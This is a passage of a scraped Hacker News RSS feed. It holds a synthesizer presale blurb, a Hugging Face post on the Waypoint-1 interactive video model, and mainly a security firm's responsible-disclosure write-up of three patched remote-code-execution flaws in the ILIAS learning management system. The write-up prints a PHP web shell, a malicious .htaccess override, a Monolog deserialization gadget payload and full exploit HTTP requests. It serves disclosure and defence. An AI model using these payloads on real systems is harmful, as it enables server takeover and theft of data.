    &lt;head rend="h2"&gt;Presale Exclusive Package with Limited Resonators&lt;/head&gt;
    &lt;p&gt;The phase8 presale exclusive package includes three selected limited-edition percussive resonators. Created through experimentation beyond the standard chromatic set, these resonators are designed for open-ended, tactile sound exploration—each offering its own distinctive percussive character. &lt;lb/&gt;Available exclusively as part of the presale package.&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</description><guid isPermaLink="false">https://news.ycombinator.com/item?id=46732967</guid><pubDate>Fri, 23 Jan 2026 14:34:46 +0000</pubDate></item><item><title>Waypoint-1: Real-Time Interactive Video Diffusion from Overworld</title><link>https://huggingface.co/blog/waypoint-1</link><description>&lt;doc fingerprint="2d1dee59851c001c"&gt;
  &lt;main&gt;
    &lt;head rend="h1"&gt;Waypoint-1: Real-time Interactive Video Diffusion from Overworld&lt;/head&gt;
    &lt;head rend="h2"&gt;Waypoint-1 Weights on the Hub&lt;/head&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Waypoint-1-Small&lt;/item&gt;
      &lt;item&gt;Waypoint-1-Medium (Coming Soon!)&lt;/item&gt;
    &lt;/list&gt;
    &lt;head rend="h2"&gt;Try Out The Model&lt;/head&gt;
    &lt;p&gt;Overworld Stream: https://overworld.stream&lt;/p&gt;
    &lt;head rend="h2"&gt;What is Waypoint-1?&lt;/head&gt;
    &lt;p&gt;Waypoint-1 is Overworld’s real-time-interactive video diffusion model, controllable and prompted via text, mouse, and keyboard. You can give the model some frames, run the model, and have it create a world you can step into and interact with.&lt;/p&gt;
    &lt;p&gt;The backbone of the model is a frame-causal rectified flow transformer trained on 10,000 hours of diverse video game footage paired with control inputs and text captions. Waypoint-1 is a latent model, meaning that it is trained on compressed frames.&lt;/p&gt;
    &lt;p&gt;The standard among existing world models has become taking pre-trained video models and fine-tuning them with brief and simplified control inputs. In contrast, Waypoint-1 is trained from the get-go with a focus on interactive experiences. With other models, controls are simple: you can move and rotate the camera once every few frames, with severe latency issues. With Waypoint-1 you are not limited at all as far as controls are concerned. You can move the camera freely with the mouse, and input any key on the keyboard, and all this with zero latency. Each frame is generated with your controls as context. Additionally, the model runs fast enough to provide a seamless experience even on consumer hardware.&lt;/p&gt;
    &lt;head rend="h2"&gt;How was it trained?&lt;/head&gt;
    &lt;p&gt;Waypoint-1 was pre-trained via diffusion forcing, a technique with which the model learns to denoise future frames given past frames. A causal attention mask is applied such that a token in any given frame can only attend to tokens in its own frame, or past frames, but not future frames. Each frame is noised randomly, and as such the model learns to denoise each frame separately. During inference, you can then denoise new frames one at a time, allowing you to generate a procedural stream of new frames.&lt;/p&gt;
    &lt;p&gt;While diffusion forcing presents a strong baseline, randomly noising all frames is misaligned with a frame-by-frame autoregressive rollout. This inference mismatch results in error accumulation, and noisy long rollouts. To address this problem we post-train with self forcing, a technique that trains the model to produce realistic outputs under a regime which matches inference behavior. Self-forcing via DMD has the added benefit of one-pass CFG, and few-step denoising.&lt;/p&gt;
    &lt;head rend="h2"&gt;The Inference Library: WorldEngine&lt;/head&gt;
    &lt;p&gt;WorldEngine is Overworld’s high‑performance inference library for interactive world model streaming. It provides the core tooling for building inference applications in pure Python, optimized for low latency, high throughput, extensibility, and developer simplicity. The runtime loop is designed for interactivity: it consumes context frame images, keyboard/mouse inputs, and text, and outputs image frames for real‑time streaming.&lt;/p&gt;
    &lt;p&gt;On Waypoint‑1‑Small (2.3B) running on a 5090, WorldEngine sustains ~30,000 token‑passes/sec (single denoising pass; 256 tokens per frame) and achieves 30 FPS at 4 steps or 60 FPS at 2 steps&lt;/p&gt;
    &lt;p&gt;Performance comes from four targeted optimizations:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;AdaLN feature caching: Avoids repeated AdaLN conditioning projections through caching and reusing so long as prompt conditioning and timesteps stay the same between fwd passes.&lt;/item&gt;
      &lt;item&gt;Static Rolling KV Cache + Flex Attention&lt;/item&gt;
      &lt;item&gt;Matmul fusion: Standard inference optimization using fused QKV projections.&lt;/item&gt;
      &lt;item&gt;Torch Compile using &lt;code&gt;torch.compile(fullgraph=True, mode="max-autotune", dynamic=False)&lt;/code&gt;&lt;/item&gt;
    &lt;/list&gt;
    &lt;code&gt;from world_engine import WorldEngine, CtrlInput

# Create inference engine
engine = WorldEngine("Overworld/Waypoint-1-Small", device="cuda")

# Specify a prompt
engine.set_prompt("A game where you herd goats in a beautiful valley")

# Optional: Force the next frame to be a specific image
img = pipeline.append_frame(uint8_img)  # (H, W, 3)

# Generate 3 video frames conditioned on controller inputs
for controller_input in [
        CtrlInput(button={48, 42}, mouse=[0.4, 0.3]),
        CtrlInput(mouse=[0.1, 0.2]),
        CtrlInput(button={95, 32, 105}),
]:
    img = engine.gen_frame(ctrl=controller_input)
&lt;/code&gt;
    &lt;head rend="h2"&gt;Build with World Engine&lt;/head&gt;
    &lt;p&gt;We’re running a &lt;code&gt;world_engine&lt;/code&gt; hackathon on 1/20/2026 - You can RSVP here. Teams of 2-4 are welcome and the prize is a 5090 GPU on the spot. We’d love to see what you can come up with to extend the world_engine and it should be a great event to meet like-minded founders, engineers, hackers and investors. We hope you can join us at 10am PST on January 20th for 8 hours of friendly competition!&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</description><guid isPermaLink="false">https://news.ycombinator.com/item?id=46733301</guid><pubDate>Fri, 23 Jan 2026 15:03:01 +0000</pubDate></item><item><title>Three RCEs in Ilias Learning Management System</title><link>https://srlabs.de/blog/breaking-ilias-part-2-three-to-rce</link><description>&lt;doc fingerprint="8c738f13a4271280"&gt;
  &lt;main&gt;
    &lt;head rend="h1"&gt;Breaking ILIAS #2: Three paths towards RCE&lt;/head&gt;
    &lt;p&gt;We describe three previously unknown vulnerabilities enabling remote code execution (RCE) in versions 8, 9, and 10 of the widely used learning management system ILIAS.&lt;/p&gt;
    &lt;p&gt;We reported the vulnerabilities through our responsible disclosure process.&lt;lb/&gt;With patches now in place, we can share the details here.&lt;/p&gt;
    &lt;head rend="h2"&gt;Background&lt;/head&gt;
    &lt;p&gt;In the first blog post of our little ILIAS series, we describe how we uncovered and exploited a stored cross-site scripting (XSS) vulnerability to obtain administrative privileges and RCE in a recent red team engagement.&lt;/p&gt;
    &lt;head rend="h2"&gt;Todayâs walkthrough&lt;/head&gt;
    &lt;p&gt;We explore similar vulnerabilities, all of which lead to RCE. First, we discuss an unauthenticated RCE exploiting the course certification import functionality, which is often found in public spaces of ILIAS instances. Next, we describe two authenticated remote-code-execution vulnerabilities caused by insecure deserialization. Both can be exploited by authorized users and often do not require full administrative rights.&lt;/p&gt;
    &lt;head rend="h1"&gt;1. Unauthenticated RCE (CVE-2025-11344)&lt;/head&gt;
    &lt;p&gt;Prerequisites. Exploitation requires public access to objects which support ILIASâ certificate functionality. An ILIAS âcertificateâ can be issued for achievements such as course completion. To avoid confusion with X.509 certificates, we also use the term âcourse certificateâ in this blog post.&lt;lb/&gt;The following object types are affected:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Test (cmdNode: &lt;code&gt;qx&lt;/code&gt;)&lt;/item&gt;
      &lt;item&gt;Course (cmdNode: &lt;code&gt;lv&lt;/code&gt;)&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;These objects, when placed in the public section of ILIAS, allow any user with read access (including unauthenticated guests) to interact with the certification editor functionality.&lt;/p&gt;
    &lt;p&gt;The âExerciseâ object shared this vulnerability in the tested v10-beta3, but it was since patched by enforcing a stricter access control in this commit: &lt;code&gt;$this-&amp;gt;checkPermission("write")&lt;/code&gt;&lt;/p&gt;
    &lt;p&gt;However, the stable release only enforces &lt;code&gt;$this-&amp;gt;checkPermission("read")&lt;/code&gt; for other object types. Read permissions are typically granted in public contexts.&lt;/p&gt;
    &lt;head rend="h2"&gt;Upload arbitrary files to the web server&lt;/head&gt;
    &lt;p&gt;We start our analysis with the ilCertificateGUI class, which handles certification configuration and export. Due to improper access control in the route processing logic, we are able to directly call actions like certificateEditor() and certificateExportFO() without authentication.&lt;/p&gt;
    &lt;p&gt;These methods are meant to be available only to users with editing rights (which would normally be course or exercise administrators). However, because the upstream controllers (&lt;code&gt;ilRepositoryGUI -&amp;gt; ilObjTestGUI&lt;/code&gt;) do not enforce proper checks, we can reach the certification upload functionality without restrictions.&lt;/p&gt;
    &lt;p&gt;The certification editor includes a feature to import course certificate templates as ZIP files. This is an intended and valid functionality to enable customization. The uploaded ZIP gets extracted and parsed by ilXlsFoParser(), which expects a specific XML format inside the archive.&lt;/p&gt;
    &lt;p&gt;Playing around, we notice something unusual: When the uploaded ZIP lacks the expected structure, the parser throws an exception when the expected XML file cannot be found.&lt;/p&gt;
    &lt;p&gt;The critical detail is that this exception is unhandled. As a result, the cleanup routine, specifically the &lt;code&gt;unlink()&lt;/code&gt; call that removes the unzipped files from disk, is never executed. This leaves all extracted files in a web-accessible subdirectory under &lt;code&gt;/data/&lt;/code&gt;.&lt;/p&gt;
    &lt;p&gt;When we upload a &lt;code&gt;.zip&lt;/code&gt; archive containing a &lt;code&gt;.php&lt;/code&gt; script, upload and extraction succeed, but direct execution of our new &lt;code&gt;.php&lt;/code&gt; file is not possible because all files under the &lt;code&gt;/data/&lt;/code&gt; directory are protected by a global &lt;code&gt;.htaccess&lt;/code&gt; file located in the ILIAS &lt;code&gt;/public/&lt;/code&gt; folder, which is configured as our web serverâs &lt;code&gt;DocumentRoot&lt;/code&gt;. It contains the following directive:&lt;/p&gt;
    &lt;code&gt;&amp;lt;IfModule mod_rewrite.c&amp;gt;
    RewriteEngine on
    RewriteRule ^data/.*/.*/.*$ wac.php [L]
&amp;lt;/IfModule&amp;gt;&lt;/code&gt;
    &lt;p&gt;This rule rewrites any requests to &lt;code&gt;/data/.*/.*/.*&lt;/code&gt; so they are handled by &lt;code&gt;wac.php&lt;/code&gt;, which in turn calls &lt;code&gt;ilWebAccessCheckerDelivery::run()&lt;/code&gt; to perform access control checks. If access is permitted, the file is served with headers like &lt;code&gt;Content-Disposition: attachment&lt;/code&gt; or &lt;code&gt;inline&lt;/code&gt; to ensure itâs treated as a download and hasnât become executable. This is an intentional safeguard to prevent arbitrary code execution, even if a &lt;code&gt;.php&lt;/code&gt; file somehow makes its way into a subdirectory of &lt;code&gt;/data/&lt;/code&gt;.&lt;/p&gt;
    &lt;head rend="h2"&gt;Change .htaccess directives&lt;/head&gt;
    &lt;p&gt;Take note of the &lt;code&gt;[L]&lt;/code&gt; flag in the &lt;code&gt;.htaccess&lt;/code&gt; definition. It is a common misconception that this flag would prevent any further rewriting altogether. In fact, &lt;code&gt;[L]&lt;/code&gt; only stops that set of rewrite rules from continuing. This is a crucial detail, as it does not prevent Apache from continuing the directory walk or parsing other &lt;code&gt;.htaccess&lt;/code&gt; files in subdirectories.&lt;/p&gt;
    &lt;p&gt;This enables us to define more hacker-friendly directives wherever we can create &lt;code&gt;.htaccess&lt;/code&gt; files. So we include our own &lt;code&gt;.htaccess&lt;/code&gt; file inside the zip file and give the web server a simple new directive:&lt;/p&gt;
    &lt;code&gt;&amp;lt;IfModule mod_rewrite.c&amp;gt;
    RewriteEngine On  
    RewriteRule ^$ . [L]  
    AddType application/x-httpd-php .sec
&amp;lt;/IfModule&amp;gt;&lt;/code&gt;
    &lt;p&gt;Once the ZIP is extracted, this &lt;code&gt;.htaccess&lt;/code&gt; file lands inside the same subfolder in &lt;code&gt;/data/&lt;/code&gt; as our PHP payload. Apache now encounters and respects multiple &lt;code&gt;.htaccess&lt;/code&gt; files: The first one at the DocumentRoot and our new one inside the extracted directory. Our new specific directives for this subdirectory overrule those specified in the parent folders.&lt;/p&gt;
    &lt;p&gt;Enabling &lt;code&gt;RewriteEngine&lt;/code&gt; "disables" the original rewrite rule, preventing Apache from routing requests through &lt;code&gt;wac.php&lt;/code&gt;. We then instruct the web server to treat &lt;code&gt;.sec&lt;/code&gt; files as PHP executables using the directive: &lt;code&gt;AddType application/x-httpd-php .sec&lt;/code&gt;. As a result, a &lt;code&gt;.sec&lt;/code&gt; file is now interpreted and executed by the server as a PHP file.&lt;/p&gt;
    &lt;quote&gt;&lt;p&gt;Why is the .sec extension necessary at all?&lt;/p&gt;&lt;lb/&gt;In an ILIAS basic installation the custom file extension might not be necessary. However, if operators apply recommended security hardening, Apache configurations following security advisories may deny direct access to&lt;code&gt;.php&lt;/code&gt;files located in&lt;code&gt;/data/*&lt;/code&gt;at host-level configuration. By using a custom extension, we preemptively circumvent such a restriction.&lt;/quote&gt;
    &lt;p&gt;We have now bypassed the global rewrite protections and enabled full code execution by adding a custom &lt;code&gt;.htaccess&lt;/code&gt; file to the ZIP file, and thus the extraction subfolder insider &lt;code&gt;/data/&lt;/code&gt;.&lt;/p&gt;
    &lt;p&gt;We upload a ZIP archive containing a folder named &lt;code&gt;rce&lt;/code&gt; with the following files:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;&lt;code&gt;a.sec&lt;/code&gt;: a simple PHP web shell (&lt;code&gt;&amp;lt;?php system($_GET['c']); ?&amp;gt;&lt;/code&gt;)&lt;/item&gt;
      &lt;item&gt;&lt;code&gt;.htaccess&lt;/code&gt;: the overriding configuration described above&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;Once uploaded, we need to locate the exact path the ZIP contents were extracted to. ILIAS dynamically generates custom paths during the course certificate import process. In our case, the resulting paths follow this pattern:&lt;/p&gt;
    &lt;p&gt;
      &lt;code&gt;/data/[client_id]/assessment/certificates/[upload_id]/[timestamp]__0__[object_type]__[upload_id]__certificate/rce/a.sec&lt;/code&gt;
    &lt;/p&gt;
    &lt;p&gt;Despite the pathâs dynamic nature, we are able to reconstruct it, as all components are either deterministic, accessible by the client or easily guessable. Hereâs how we obtain each component:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;&lt;code&gt;client_id&lt;/code&gt;can be found in the&lt;code&gt;ilClientId&lt;/code&gt;cookie set by ILIAS during session initialization.&lt;/item&gt;
      &lt;item&gt;&lt;code&gt;upload_id&lt;/code&gt;would be exposed to authenticated in users in a JavaScript. However, this is not the case for unauthenticated users, so we need to find a workaround. Looking at the execution flow we notice that any method in the related class can be invoked directly. Conveniently, thereâs a method named certificateExportFO(). By setting its name as the value of the&lt;code&gt;cmd&lt;/code&gt;URL parameter we can directly invoke it and trigger a 302 redirect initiating a file download. The filename in the&lt;code&gt;Content-Disposition&lt;/code&gt;header includes&lt;code&gt;upload_id&lt;/code&gt;, which we extract using the following regular expression:&lt;code&gt;__([a-zA-Z0-9]{3})__(\d+)__&lt;/code&gt;. This allows us to recover the necessary ID for any publicly accessible and vulnerable object type.&lt;/item&gt;
      &lt;item&gt;&lt;code&gt;timestamp&lt;/code&gt;is generated using PHPâs&lt;code&gt;time()&lt;/code&gt;function at the moment the foldername is generated right after upload. Because this happens just milliseconds after the upload request, we can identify the value by iterating through a small time window.&lt;/item&gt;
      &lt;item&gt;&lt;code&gt;object_type&lt;/code&gt;is a short identifier representing the ILIAS object type, determined using the&lt;code&gt;ref_id&lt;/code&gt;in the URL. In our case, the object is&lt;code&gt;TestObject&lt;/code&gt;, so the type is&lt;code&gt;tst&lt;/code&gt;.&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;Putting it all together, the final path may look like this:&lt;code&gt;/data/myilias/assessment/certificates/415/1753256753__0__tst__415__certificate/rce/a.sec&lt;/code&gt;&lt;/p&gt;
    &lt;p&gt;A GET request to that URL with a &lt;code&gt;?c=&amp;lt;CLI_COMMAND&amp;gt;&lt;/code&gt; query parameter confirms successful remote code execution, returning the commandâs output.&lt;/p&gt;
    &lt;head rend="h3"&gt;CVE-2025-11344 - PoC Exploit&lt;/head&gt;
    &lt;p&gt;Summing up, this RCE vulnerability is results from a combination of overlooked security issues:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Inadequate access control checks in the class chain leading to course certificate-related actions&lt;/item&gt;
      &lt;item&gt;Uncaught exceptions on ZIP and XML parsing logic prevent cleanup of extracted files&lt;/item&gt;
      &lt;item&gt;Insufficient checks on the extracted zip contents allow us to place an &lt;code&gt;.htaccess&lt;/code&gt;file&lt;/item&gt;
      &lt;item&gt;.htaccess inheritance allows us to override directives for subfolders&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;Impact: Complete server compromise with no authentication required if one of the two object types âTestâ or âCourseâ is exposed in a public area.&lt;/p&gt;
    &lt;head rend="h1"&gt;2. Authenticated RCE (CVE-2025-11345)&lt;/head&gt;
    &lt;p&gt;File uploads during import in ILIAS are handled by several adapters defined for different import models in class.ilImport.php. The adapter first extracts the uploaded ZIP file and processes the accompanying XML. During this process, importXmlRepresentation reads the extracted XML, which is then passed into &lt;code&gt;importRandomQuestionSetConfig&lt;/code&gt; and reaches an &lt;code&gt;unserialize()&lt;/code&gt; call in class.ilObjTestXMLParser.&lt;/p&gt;
    &lt;p&gt;Insecure deserialization. The use of &lt;code&gt;unserialize()&lt;/code&gt; alone does not inherently result in RCE. However, passing attacker-controlled input to this function without restricting &lt;code&gt;allowed_classes&lt;/code&gt; via the &lt;code&gt;options&lt;/code&gt; parameter often enables undesired behavior. The PHP documentation also highlights that object instantiation and autoloading in such scenarios can lead to code execution.&lt;/p&gt;
    &lt;p&gt;Magic functions. &lt;code&gt;unserialize()&lt;/code&gt; becomes a problem when so-called magic functions are available, which override PHP default behavior for certain actions on the object especially around its lifecycle (creation, destruction but also serialization and deserialization). If the application contains any class definition that contains a magic function that executes code based on attacker-controllable class fields, we can achieve RCE.&lt;/p&gt;
    &lt;p&gt;Composer-based PHP applications frequently include third-party packages that contain such classes with exploitable magic methods simply due to a large dependency footprint. To assess this risk in ILIAS, we examine all dependencies and stumble across the inclusion of &lt;code&gt;Monolog&lt;/code&gt;, a commonly used logging library.&lt;/p&gt;
    &lt;p&gt;We construct a Monolog-specific payload using PHARGGC, a tool specialized in constructing gadget chains for PHP &lt;code&gt;unserialize()&lt;/code&gt;. The payload leverages a combination of &lt;code&gt;FingersCrossedHandler&lt;/code&gt; and &lt;code&gt;GroupHandler&lt;/code&gt; to achieve code execution. For demonstration purposes, the payload below executes the following command:
&lt;code&gt;echo 'SRLabs was here' &amp;gt; /tmp/__PWNED__&lt;/code&gt;&lt;/p&gt;
    &lt;p&gt;To ensure reliable execution, we hex-encode the fields in order to replace raw &lt;code&gt;\0&lt;/code&gt; characters that would otherwise disrupt parsing. The final payload is:&lt;/p&gt;
    &lt;code&gt;O:37:"Monolog\Handler\FingersCrossedHandler":3:{S:16:"\00\2a\00\70\61\73\73\74\68\72\75\4c\65\76\65\6c";i:0;S:9:"\00\2a\00\62\75\66\66\65\72";a:1:{S:4:"\74\65\73\74";a:2:{i:0;S:39:"\65\63\68\6f\20\27\53\52\4c\61\62\73\20\77\61\73\20\68\65\72\65\27\20\3e\20\2f\74\6d\70\2f\5f\5f\50\57\4e\45\44\5f\5f";S:5:"\6c\65\76\65\6c";N;}}S:10:"\00\2a\00\68\61\6e\64\6c\65\72";O:28:"Monolog\Handler\GroupHandler":1:{S:13:"\00\2a\00\70\72\6f\63\65\73\73\6f\72\73";a:2:{i:0;S:7:"\63\75\72\72\65\6e\74";i:1;S:6:"\73\79\73\74\65\6d";}}}&lt;/code&gt;
    &lt;p&gt;We embed the payload in the following XML structure to trigger the &lt;code&gt;unserialize&lt;/code&gt; call for the &lt;code&gt;taxFilter&lt;/code&gt; field of &lt;code&gt;RandomQuestionSelectionDefinition&lt;/code&gt;:&lt;/p&gt;
    &lt;code&gt;&amp;lt;?xml version="1.0" encoding="utf-8"?&amp;gt;
&amp;lt;!DOCTYPE Test SYSTEM "http://www.ilias.uni-koeln.de/download/dtd/ilias_co.dtd"&amp;gt;
&amp;lt;!--Export of ILIAS Test 326 of installation 0--&amp;gt;
&amp;lt;ContentObject Type="Test"&amp;gt;
&amp;lt;RandomQuestionSetConfig&amp;gt;
  &amp;lt;RandomQuestionStage&amp;gt;&amp;lt;/RandomQuestionStage&amp;gt;
  &amp;lt;RandomQuestionSelectionDefinitions&amp;gt;
    &amp;lt;RandomQuestionSelectionDefinition poolId="320" amountMode="" poolQuestCount="1" questAmount="1" position="0" taxFilter='O:37:"Monolog\Handler\FingersCrossedHandler":3:{S:16:"\00\2a\00\70\61\73\73\74\68\72\75\4c\65\76\65\6c";i:0;S:9:"\00\2a\00\62\75\66\66\65\72";a:1:{S:4:"\74\65\73\74";a:2:{i:0;S:39:"\65\63\68\6f\20\27\53\52\4c\61\62\73\20\77\61\73\20\68\65\72\65\27\20\3e\20\2f\74\6d\70\2f\5f\5f\50\57\4e\45\44\5f\5f";S:5:"\6c\65\76\65\6c";N;}}S:10:"\00\2a\00\68\61\6e\64\6c\65\72";O:28:"Monolog\Handler\GroupHandler":1:{S:13:"\00\2a\00\70\72\6f\63\65\73\73\6f\72\73";a:2:{i:0;S:7:"\63\75\72\72\65\6e\74";i:1;S:6:"\73\79\73\74\65\6d";}}}' homogeneous="" synctimestamp=""/&amp;gt;
    &amp;lt;/RandomQuestionSelectionDefinitions&amp;gt;
  &amp;lt;/RandomQuestionSetConfig&amp;gt;
&amp;lt;/ContentObject&amp;gt;&lt;/code&gt;
    &lt;p&gt;When the payload is embedded in a valid ILIAS import archive, uploading it through the import endpoint results in RCE. The request below illustrates the process:&lt;/p&gt;
    &lt;code&gt;POST /ilias.php?baseClass=importuploadhandlergui&amp;amp;cmd=upload HTTP/1.1
Host: lab1.local
X-Requested-With: XMLHttpRequest
Accept: application/json
Content-Type: multipart/form-data; boundary=----ABC
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36
Origin: http://lab1.local
Referer: http://lab1.local/ilias.php?baseClass=ilrepositorygui&amp;amp;cmdNode=wr:pp&amp;amp;cmdClass=ilObjRootFolderGUI&amp;amp;cmd=render&amp;amp;ref_id=1
Accept-Encoding: gzip, deflate, br
Cookie: ilClientId=myilias; PHPSESSID=8tjnfk65opmcrpkgqfijqfrg2i;
Connection: keep-alive

------ABC
Content-Disposition: form-data; name="file"; filename="1757316449__0__tst_326.zip"
Content-Type: application/zip
&amp;lt;ZIP_FILE_TO_UPLOAD&amp;gt;

------ABC--&lt;/code&gt;
    &lt;p&gt;Impact: Complete server compromise for authenticated users with permission to use the described import functionality â typically course administrators or similar roles.&lt;/p&gt;
    &lt;head rend="h1"&gt;3. Authenticated RCE (CVE-2025-11346)&lt;/head&gt;
    &lt;p&gt;A third RCE related to insecure deserialization affects the &lt;code&gt;f_settings&lt;/code&gt; URL parameter. This is especially interesting as we do not need to prepare any file input. We can simply pass our command as part of the request. Exploitation works in a similar way as above, but the serialized string can be directly encoded in Base64 without the need to wrap it in XML:&lt;/p&gt;
    &lt;code&gt;POST /ilias.php?baseClass=ilrepositorygui&amp;amp;cmdNode=wr:qx:1l&amp;amp;cmdClass=ilias\test\settings\scorereporting\settingsscoringgui&amp;amp;cmd=cancelSaveForm&amp;amp;ref_id=102&amp;amp;ref_id=104 HTTP/1.1
Host: lab1.local
Cookie: ilClientId=myilias; PHPSESSID=8tjnfk65opmcrpkgqfijqfrg2i
Content-Type: application/x-www-form-urlencoded

f_settings=TzozNzoiTW9ub2xvZ1xIYW5kbGVyXEZpbmdlcnNDcm9zc2VkSGFuZGxlciI6Mzp7UzoxNjoiXDAwXDJhXDAwXDcwXDYxXDczXDczXDc0XDY4XDcyXDc1XDRjXDY1XDc2XDY1XDZjIjtpOjA7Uzo5OiJcMDBcMmFcMDBcNjJcNzVcNjZcNjZcNjVcNzIiO2E6MTp7Uzo0OiJcNzRcNjVcNzNcNzQiO2E6Mjp7aTowO1M6Mzk6Ilw2NVw2M1w2OFw2ZlwyMFwyN1w1M1w1Mlw0Y1w2MVw2Mlw3M1wyMFw3N1w2MVw3M1wyMFw2OFw2NVw3Mlw2NVwyN1wyMFwzZVwyMFwyZlw3NFw2ZFw3MFwyZlw1Zlw1Zlw1MFw1N1w0ZVw0NVw0NFw1Zlw1ZiI7Uzo1OiJcNmNcNjVcNzZcNjVcNmMiO047fX1TOjEwOiJcMDBcMmFcMDBcNjhcNjFcNmVcNjRcNmNcNjVcNzIiO086Mjg6Ik1vbm9sb2dcSGFuZGxlclxHcm91cEhhbmRsZXIiOjE6e1M6MTM6IlwwMFwyYVwwMFw3MFw3Mlw2Zlw2M1w2NVw3M1w3M1w2Zlw3Mlw3MyI7YToyOntpOjA7Uzo3OiJcNjNcNzVcNzJcNzJcNjVcNmVcNzQiO2k6MTtTOjY6Ilw3M1w3OVw3M1w3NFw2NVw2ZCI7fX19&lt;/code&gt;
    &lt;p&gt;Supplied input is passed directly to the getRelayedRequest() method, where it is Base64-decoded and then deserialized:&lt;/p&gt;
    &lt;code&gt;private function getRelayedRequest(): Request
{
    return unserialize(
        base64_decode(
            $this-&amp;gt;request-&amp;gt;getParsedBody()[self::F_CONFIRM_SETTINGS]
        )
    );
}&lt;/code&gt;
    &lt;p&gt;This simple flow enables direct execution of attacker-controlled payloads, resulting in RCE for authenticated users.&lt;/p&gt;
    &lt;p&gt;Impact: Complete server compromise for authenticated users with permission to call &lt;code&gt;ScoreReportingGUI&lt;/code&gt; endpoints that take the &lt;code&gt;f_settings&lt;/code&gt; parameter.&lt;/p&gt;
    &lt;head rend="h2"&gt;Conclusion&lt;/head&gt;
    &lt;p&gt;ILIAS is a versatile and correspondingly complex platform. With about 1.2 million lines of PHP code, decades of features, and a broad plugin ecosystem, itâs no surprise that subtle edge cases can lead to serious security vulnerabilities.&lt;/p&gt;
    &lt;p&gt;None of this makes ILIAS a âbad choiceâ for eLearning per se. Itâs open source, widely deployed, and backed by an active community. Nonetheless, operators need to treat ILIAS like any other critical application and apply security updates promptly: Track advisories, patch within standard change windows and prepare an expedited path for RCEs, keep extensions lean and current, and avoid falling behind for multiple minor versions.&lt;/p&gt;
    &lt;p&gt;Security Research Labs engages in a broad range of offensive and defensive IT security consulting such as red teaming, code audits and strategic security assessments. If this kind of work excites you, we are hiring!&lt;/p&gt;
    &lt;p&gt;This blog post is the second part of a two-part series on security vulnerabilities in ILIAS:&lt;/p&gt;
    &lt;head rend="h2"&gt;Responsible Disclosure&lt;/head&gt;
    &lt;p&gt;As per standard practice, we disclosed all identified vulnerabilities to the vendor before publishing this blog post. The full disclosure timeline is provided below.&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;2025-07-24: Discovered RCE #1 and #2&lt;/item&gt;
      &lt;item&gt;2025-08-25: Discovered RCE #3. Creating PoC and writeup&lt;/item&gt;
      &lt;item&gt;2025-09-03: Requested CVE IDs&lt;/item&gt;
      &lt;item&gt;2025-09-08: Notified vendor&lt;/item&gt;
      &lt;item&gt;2025-09-15: Vendor verified vulnerabilities&lt;/item&gt;
      &lt;item&gt;2025-09-23: Initial patches releases (8.24, 9.14, 10.2)&lt;/item&gt;
      &lt;item&gt;2025-09-25: Unauth RCE Fix bypass discovered&lt;/item&gt;
      &lt;item&gt;2025-09-26: Vendor notified&lt;/item&gt;
      &lt;item&gt;2025-08-29: CVE ID requested for unauthenticated RCE vulnerability bypass.&lt;/item&gt;
      &lt;item&gt;2025-09-06: CVE IDs assigned (CVE-2025-11344, CVE-2025-11345, CVE-2025-11346)&lt;/item&gt;
      &lt;item&gt;2025-09-07: Requested a CNA score update because the current CVSS 5.1 for CVE-2025-11344 is incorrect and understates the impact of an unauthenticated RCE vulnerability *&lt;/item&gt;
      &lt;item&gt;2025-09-23: Patches released (8.25, 9.15, 10.3)&lt;/item&gt;
      &lt;item&gt;2026-01-23: Publication of this blog post and CVE IDs&lt;/item&gt;
      &lt;item&gt;2026-01-23: Request for update published CVE on MITRE&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;* We also contacted the vendor regarding the CVSS rating, which appears to have been assigned arbitrarily without a transparent scoring matrix or justification. Unfortunately, we did not receive a response. This lack of transparency creates a significant issue for software operators, as the true severity of the vulnerability cannot be reliably assessed based on the CVE entry. As a result, there is a risk that affected systems were not updated in a timely manner due to the misleadingly low severity rating.&lt;/p&gt;
    &lt;head rend="h2"&gt;Advisories and release notes&lt;/head&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;https://github.com/ILIAS-eLearning/ILIAS/releases/tag/v10.2&lt;/item&gt;
      &lt;item&gt;https://github.com/ILIAS-eLearning/ILIAS/releases/tag/v10.3&lt;/item&gt;
      &lt;item&gt;https://github.com/ILIAS-eLearning/ILIAS/releases/tag/v9.14&lt;/item&gt;
      &lt;item&gt;https://github.com/ILIAS-eLearning/ILIAS/releases/tag/v9.15&lt;/item&gt;
      &lt;item&gt;https://github.com/ILIAS-eLearning/ILIAS/releases/tag/v8.24&lt;/item&gt;
      &lt;item&gt;https://github.com/ILIAS-eLearning/ILIAS/releases/tag/v8.25&lt;/item&gt;
    &lt;/list&gt;
    &lt;head rend="h2"&gt;Researchers involved&lt;/head&gt;
    &lt;p&gt;Daniel KÃ¶hler, Florian Wilkens, Rachna Shriwas, Rene Rehme, Mahmoud Anas Khalifa&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</description><guid isPermaLink="false">https://news.ycombinator.com/item?id=46733899</guid><pubDate>Fri, 23 Jan 2026 15:48:54 +0000</pubDate></item><item><title>Show HN: Teemux – Zero-config log multiplexer with built-in MCP server</title><link>https://teemux.com/</link><description>&lt;doc fingerprint="c41358d3a21affd3"&gt;
  &lt;main&gt;
    &lt;head rend="h2"&gt;Usage&lt;/head&gt;
